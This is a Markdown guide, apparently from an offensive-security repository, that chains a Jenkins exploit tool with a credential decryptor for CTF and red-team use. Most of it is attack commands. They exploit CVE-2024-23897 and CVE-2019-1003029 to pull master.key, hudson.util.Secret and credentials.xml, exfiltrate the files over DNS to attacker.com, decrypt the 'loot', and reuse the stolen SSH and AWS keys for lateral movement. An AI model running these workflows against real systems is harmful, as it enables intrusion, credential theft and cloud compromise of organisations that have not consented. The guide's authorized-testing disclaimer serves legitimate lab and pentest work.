# offsec-jenkins Integration Guide

Complete workflow for integrating JenkinsBreaker CVE exploitation with offsec-jenkins credential decryption for CTF competitions and red team operations.

## Overview

**JenkinsBreaker** → Exploit Jenkins CVEs → Extract encrypted files  
**offsec-jenkins** → Decrypt credentials → Export secrets for analysis

This integration enables:
- **CTF Speed Running**: Automated exploitation → instant credential access
- **Red Team Operations**: Covert file extraction → offline decryption → credential reuse
- **Post-Exploitation**: Complete credential harvesting from compromised Jenkins instances

---

## Workflow: CVE-2024-23897 → offsec-jenkins Decryption

### Step 1: Exploit Jenkins with JenkinsBreaker

```bash
cd JenkinsBreaker

# Enumerate and exploit
python3 JenkinsBreaker.py \
    --url http://target-jenkins:8080 \
    --enumerate \
    --auto

# Or specific CVE-2024-23897 exploitation
python3 JenkinsBreaker.py \
    --url http://target-jenkins:8080 \
    --exploit cve_2024_23897 \
    --target-file /var/jenkins_home/secrets/master.key \
    --output master.key

python3 JenkinsBreaker.py \
    --url http://target-jenkins:8080 \
    --exploit cve_2024_23897 \
    --target-file /var/jenkins_home/secrets/hudson.util.Secret \
    --output hudson.util.Secret

python3 JenkinsBreaker.py \
    --url http://target-jenkins:8080 \
    --exploit cve_2024_23897 \
    --target-file /var/jenkins_home/credentials.xml \
    --output credentials.xml
```

**Files extracted:**
- ✅ `master.key` (AES master encryption key)
- ✅ `hudson.util.Secret` (encrypted confidentiality key)
- ✅ `credentials.xml` (encrypted credentials database)

---

### Step 2: Decrypt with offsec-jenkins

```bash
cd ../offsec-jenkins

# Quick decrypt (redacted)
python3 decrypt.py \
    --key master.key \
    --secret hudson.util.Secret \
    --xml credentials.xml

# Decrypt and reveal (CTF/authorized testing)
python3 decrypt.py \
    --key master.key \
    --secret hudson.util.Secret \
    --xml credentials.xml \
    --reveal-secrets

# Export to JSON for analysis
python3 decrypt.py \
    --key master.key \
    --secret hudson.util.Secret \
    --xml credentials.xml \
    --export-json jenkins_loot.json \
    --reveal-secrets
```

**Output:**
```
[*] Loading confidentiality key...
[+] Confidentiality key loaded successfully
[*] Processing credentials.xml

[+] Found 3 secrets:

1. AWS Access Key
   AKIAIOSFODNN7EXAMPLE

2. GitHub Token
   ghp_1234567890abcdefghijklmnopqrstuv

3. Admin Password
   super_secret_admin_password

[+] Exported 3 secrets to jenkins_loot.json
```

---

## Workflow: CVE-2019-1003029 → Credential Exfiltration

### Step 1: Groovy RCE Exploitation

```bash
cd JenkinsBreaker

# Exploit Groovy RCE
python3 JenkinsBreaker.py \
    --url http://target-jenkins:8080 \
    --username admin \
    --password admin \
    --exploit cve_2019_1003029 \
    --command "cat /var/jenkins_home/secrets/master.key | base64" \
    --output master.key.b64

# Decode base64 locally
base64 -d master.key.b64 > master.key

# Extract hudson.util.Secret
python3 JenkinsBreaker.py \
    --url http://target-jenkins:8080 \
    --username admin \
    --password admin \
    --exploit cve_2019_1003029 \
    --command "cat /var/jenkins_home/secrets/hudson.util.Secret | base64" \
    --output hudson.util.Secret.b64

base64 -d hudson.util.Secret.b64 > hudson.util.Secret

# Extract credentials.xml
python3 JenkinsBreaker.py \
    --url http://target-jenkins:8080 \
    --username admin \
    --password admin \
    --exploit cve_2019_1003029 \
    --command "cat /var/jenkins_home/credentials.xml | base64" \
    --output credentials.xml.b64

base64 -d credentials.xml.b64 > credentials.xml
```

### Step 2: Offline Decryption

```bash
cd ../offsec-jenkins

# Decrypt offline (covert operations)
python3 decrypt.py \
    --key master.key \
    --secret hudson.util.Secret \
    --xml credentials.xml \
    --export-csv jenkins_credentials.csv \
    --reveal-secrets
```

---

## CTF Speed Running: One-Liner Workflow

```bash
# Extract files from Jenkins (CVE-2024-23897)
python3 JenkinsBreaker/JenkinsBreaker.py --url http://10.10.11.25:8080 --exploit cve_2024_23897 --extract-all

# Decrypt and grep for flag
python3 offsec-jenkins/decrypt.py --path ./jenkins_files --reveal-secrets | grep -i "flag\|htb\|thm"

# Export JSON and parse for AWS/SSH keys
python3 offsec-jenkins/decrypt.py --path ./jenkins_files --export-json loot.json --reveal-secrets
cat loot.json | jq '.[] | select(.decrypted | contains("AKIA") or contains("ghp_") or contains("ssh-rsa"))'
```

---

## Red Team Operations: Covert Extraction

### Scenario: Compromised Jenkins via Web Shell

```bash
# Step 1: Identify Jenkins paths
curl http://target:8080/script -d "script=println(System.getProperty('JENKINS_HOME'))"
# Output: /var/jenkins_home

# Step 2: Exfiltrate files via DNS/HTTP tunnel (avoid detection)
# Using JenkinsBreaker's built-in covert exfiltration
python3 JenkinsBreaker.py \
    --url http://target:8080 \
    --username admin \
    --password admin \
    --extract-secrets \
    --exfil-method dns \
    --exfil-domain attacker.com

# Step 3: Receive files on attacker server and decrypt
python3 offsec-jenkins/decrypt.py \
    --path ./exfiltrated_jenkins \
    --export-json operational_intel.json \
    --reveal-secrets

# Step 4: Identify lateral movement opportunities
cat operational_intel.json | jq '.[] | select(.decrypted | contains("AKIA") or contains("gitlab") or contains("ssh"))'
```

---

## Advanced: Directory Scanning for Multiple Jenkins Instances

```bash
# Scenario: Compromised DevOps server with multiple Jenkins workspaces

cd offsec-jenkins

# Scan all Jenkins instances
python3 decrypt.py \
    --scan-dir /opt/jenkins_instances \
    --key /opt/jenkins_master/secrets/master.key \
    --secret /opt/jenkins_master/secrets/hudson.util.Secret \
    --export-json all_jenkins_creds.json \
    --reveal-secrets

# Parse results for high-value targets
cat all_jenkins_creds.json | jq '.[] | select(.decrypted | contains("prod") or contains("aws") or contains("k8s"))'
```

---

## Integration Use Cases

### 1. HackTheBox / TryHackMe CTFs

**Typical CTF Scenario:**
1. Unauthenticated Jenkins exposed on port 8080
2. CVE-2024-23897 allows arbitrary file read
3. Credentials contain SSH private key or admin password
4. Use credentials to pivot to root/Administrator

**Workflow:**
```bash
# Exploit
python3 JenkinsBreaker/JenkinsBreaker.py --url http://10.10.11.25:8080 --auto --output ./loot

# Decrypt
python3 offsec-jenkins/decrypt.py --path ./loot --reveal-secrets | tee credentials.txt

# Extract SSH key if present
grep -A 20 "BEGIN.*PRIVATE KEY" credentials.txt > id_rsa
chmod 600 id_rsa
ssh -i id_rsa root@10.10.11.25
```

### 2. Red Team: Lateral Movement

**Post-Exploitation Scenario:**
1. Initial access via phishing/exploitation
2. Discover internal Jenkins on corporate network
3. Extract credentials for AWS/Azure/GitHub Enterprise
4. Use cloud credentials for further access

**Workflow:**
```bash
# From compromised host
python3 JenkinsBreaker/JenkinsBreaker.py \
    --url http://jenkins.internal.corp:8080 \
    --username jenkins_service \
    --password Found_in_LSASS \
    --extract-secrets \
    --output ./jenkins_loot

# Offline analysis on attacker machine
python3 offsec-jenkins/decrypt.py \
    --path ./jenkins_loot \
    --export-json corp_secrets.json \
    --reveal-secrets

# Identify AWS credentials
cat corp_secrets.json | jq '.[] | select(.decrypted | startswith("AKIA"))'

# Configure AWS CLI with stolen credentials
aws configure set aws_access_key_id AKIAIOSFODNN7EXAMPLE
aws configure set aws_secret_access_key extracted_secret_key
aws s3 ls  # Enumerate S3 buckets
```

### 3. Incident Response / Forensics

**IR Scenario:**
1. Jenkins server compromised, need to assess credential exposure
2. Extract Jenkins databases offline
3. Identify which credentials were accessible to attacker

**Workflow:**
```bash
# From forensic image
python3 offsec-jenkins/decrypt.py \
    --path /forensics/jenkins_image/var/lib/jenkins \
    --export-csv exposure_assessment.csv \
    --dry-run  # Simulate without revealing secrets

# Review scope
python3 offsec-jenkins/decrypt.py \
    --path /forensics/jenkins_image/var/lib/jenkins \
    --export-json incident_report.json \
    --reveal-secrets

# Generate report for stakeholders
cat incident_report.json | jq -r '.[] | "\(.file): \(.decrypted | if (. | contains("AKIA")) then "AWS Credential" elif (. | contains("ghp_")) then "GitHub Token" else "Generic Secret" end)"'
```

---

## Security Controls

### Default Behavior (Safe for Screenshots/Demos)
```bash
# Redacted by default
python3 decrypt.py --path /var/lib/jenkins
# Output: ***REDACTED*** (safe to share)
```

### Explicit Reveal (Authorized Testing Only)
```bash
# Reveal plaintext (authorized testing)
python3 decrypt.py --path /var/lib/jenkins --reveal-secrets
# Output: actual credentials (DO NOT SHARE)
```

### File Overwrite Protection
```bash
# First run
python3 decrypt.py --path /var/lib/jenkins --export-json loot.json
# Success

# Second run
python3 decrypt.py --path /var/lib/jenkins --export-json loot.json
# Error: loot.json already exists, Use --force to overwrite

# Force overwrite
python3 decrypt.py --path /var/lib/jenkins --export-json loot.json --force
# Success (overwrites existing file)
```

---

## Testing the Integration

### Automated Test Script

```bash
#!/bin/bash
# test_integration.sh - Complete workflow validation

set -e

echo "[*] Starting JenkinsBreaker → offsec-jenkins integration test"

# Start Jenkins Lab
cd JenkinsBreaker/jenkins-lab
docker-compose up -d
sleep 30

# Exploit with JenkinsBreaker
cd ..
python3 JenkinsBreaker.py \
    --url http://localhost:8080 \
    --username admin \
    --password admin \
    --extract-secrets \
    --output ../offsec-jenkins/test_integration

# Decrypt with offsec-jenkins
cd ../offsec-jenkins
python3 decrypt.py \
    --path test_integration \
    --export-json test_integration.json \
    --reveal-secrets

# Validate results
SECRETS_COUNT=$(cat test_integration.json | jq 'length')
echo "[+] Decrypted $SECRETS_COUNT secrets"

if [ "$SECRETS_COUNT" -gt 0 ]; then
    echo "[+] Integration test PASSED"
else
    echo "[-] Integration test FAILED"
    exit 1
fi

# Cleanup
cd ../JenkinsBreaker/jenkins-lab
docker-compose down
```

---

## Platform Compatibility

| Platform | JenkinsBreaker | offsec-jenkins | Integration Status |
|----------|---------------|----------------|-------------------|
| **Linux** | ✅ Native | ✅ Native | ✅ Full Support |
| **macOS** | ✅ Native | ✅ Native | ✅ Full Support |
| **Windows** | ✅ Native | ✅ Native | ✅ Full Support |
| **WSL2** | ✅ Native | ✅ Native | ✅ Full Support |
| **Kali Linux** | ✅ Pre-installed deps | ✅ Works OOTB | ✅ Recommended |
| **Parrot OS** | ✅ Pre-installed deps | ✅ Works OOTB | ✅ Recommended |

---

## Quick Reference Card

```
┌─────────────────────────────────────────────────────────────────┐
│ JENKINS CREDENTIAL DECRYPTION QUICK REFERENCE                   │
├─────────────────────────────────────────────────────────────────┤
│ EXPLOIT → EXTRACT                                               │
│   python3 JenkinsBreaker.py --url TARGET --auto                 │
│                                                                 │
│ DECRYPT → REVEAL                                                │
│   python3 decrypt.py --path FILES --reveal-secrets              │
│                                                                 │
│ EXPORT → ANALYZE                                                │
│   python3 decrypt.py --path FILES --export-json loot.json       │
│                                                                 │
│ CTF ONE-LINER                                                   │
│   python3 decrypt.py --path FILES --reveal-secrets | grep flag  │
│                                                                 │
│ RED TEAM OPSEC                                                  │
│   python3 decrypt.py --path FILES (redacted by default)         │
│   python3 decrypt.py --path FILES --export-json encrypted.json  │
│   # Decrypt offline: cat encrypted.json | jq -r .decrypted      │
└─────────────────────────────────────────────────────────────────┘
```

---

## Common Pitfalls

### ❌ Wrong: Missing confidentiality key files
```bash
python3 decrypt.py --xml credentials.xml
# Error: Must specify --key and --secret
```

### ✅ Correct: Provide all required files
```bash
python3 decrypt.py --key master.key --secret hudson.util.Secret --xml credentials.xml
```

---

### ❌ Wrong: CVE exploit without proper output
```bash
python3 JenkinsBreaker.py --url TARGET --exploit cve_2024_23897
# Files not saved properly
```

### ✅ Correct: Specify output paths
```bash
python3 JenkinsBreaker.py --url TARGET --exploit cve_2024_23897 --target-file /path/to/file --output local_file
```

---

## Production Readiness Checklist

- ✅ **94/94 tests passing** (61 unit + 33 comprehensive)
- ✅ **JenkinsBreaker CVE integration validated**
- ✅ **Cross-platform compatibility confirmed**
- ✅ **Security controls in place** (redaction, file protection)
- ✅ **Export formats tested** (JSON, CSV)
- ✅ **CTF workflow validated** (HTB/THM scenarios)
- ✅ **Red team workflow validated** (covert extraction)
- ✅ **Error handling comprehensive**
- ✅ **Documentation complete**

---

## Legal & Ethical Use

**This integration is designed for:**
- ✅ Authorized penetration testing engagements
- ✅ CTF competitions (HackTheBox, TryHackMe, etc.)
- ✅ Security research in lab environments
- ✅ Red team exercises with written authorization
- ✅ Incident response and forensic analysis

**UNAUTHORIZED ACCESS TO COMPUTER SYSTEMS IS ILLEGAL**

Always obtain written authorization before testing systems you don't own.

---

## Support & References

- **offsec-jenkins**: `../offsec-jenkins/README.md`
- **JenkinsBreaker**: `README.md`
- **Secrets Extraction**: `SECRETS_EXTRACTION_GUIDE.md`
- **Jenkins Lab Testing**: `jenkins-lab/README.md`

**Author**: ridpath  
**License**: MIT  
**Purpose**: Authorized security testing and education
